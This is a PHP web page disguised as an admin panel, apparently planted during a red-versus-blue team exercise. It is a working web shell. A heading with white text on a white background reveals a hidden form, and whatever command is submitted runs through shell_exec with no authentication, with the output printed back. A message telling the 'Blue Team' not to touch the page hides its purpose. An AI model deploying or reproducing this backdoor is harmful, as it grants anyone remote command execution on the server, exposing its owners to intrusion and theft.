<!DOCTYPE html>

<html>
<head>
    <title>Admin Panel DO NOT TOUCH</title>
    <style>
    
        body {
          
            font-family: "Times New Roman", Times, serif;
            text-align: center;
            padding: 30px;
        }
        h2 {
            color: white;
            background-color: #FFFFFF;
            padding: 15px;
            border-radius: 10px;
            max-width: 600px;
            margin: 20px auto;
        }
   
        form, pre {
            background-color: rgba(255, 255, 255, 0.92);
            padding: 20px;
            border-radius: 10px;
            margin: 20px auto;
            max-width: 600px;
            overflow-x: auto;
        }

        input, button {
            padding: 10px;
            /*
            border-radius: 6px;
            border: 1px solid rgba(237, 53, 12, 0.47);
            */
        }

        input {
            width: 65%;
        }

        button {
            background-color: #FFFFFF;
            cursor: pointer;
            font-weight: bold;
        }
     
        /*
        This section hides the commandBox when the page is first loaded
        */
        #commandBox {
            display: none;
        }
    </style>
</head>
<body>
    <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit.</p>
    <!-- 
    This section is used to define the h2 section. When this heading is clicked, it calls the showCommandBox function defined
    below. It also displays the below text in the heading
    -->
    <h2 onclick="showCommandBox()">
        Blue Team, this is for Snoopy's eyes only. Please do not touch or modify this page. It is used for testing and development purposes.
    </h2>

    <div id="commandBox">
        <form method="POST">
            <input
                type="text"
                name="command"
                placeholder="Enter a command"
                required
            >
            <!--This part creates a button that submits the input using the post method above -->
            <button type="submit">Run!</button>
        </form>
    </div>
  
    <?php
    # If the browser submitted a post request, continue. Otherwise leave
    if ($_SERVER["REQUEST_METHOD"] === "POST") {
        # create a command variable using the command th euser entered in the html form, using an empty string as fallback if
        # value is null or doesn't exist
        $command = $_POST["command"] ?? "";
        # creates an output variable storing the output of passing the user entered command to a shell
        $output = shell_exec($command);
    # if the output is not null or empty, then continue
    if ($output !== null && $output !== "") {
        # this formats the output for readability
        # htmlspecialchars converts special characters into safe HTML
        echo "<pre>" .
             htmlspecialchars($output, ENT_QUOTES, "UTF-8") .
             "</pre>";
    }
}
?>
    <script>
        function showCommandBox() {
            document.getElementById("commandBox").style.display = "block";
        }
    </script>


</body>
</html>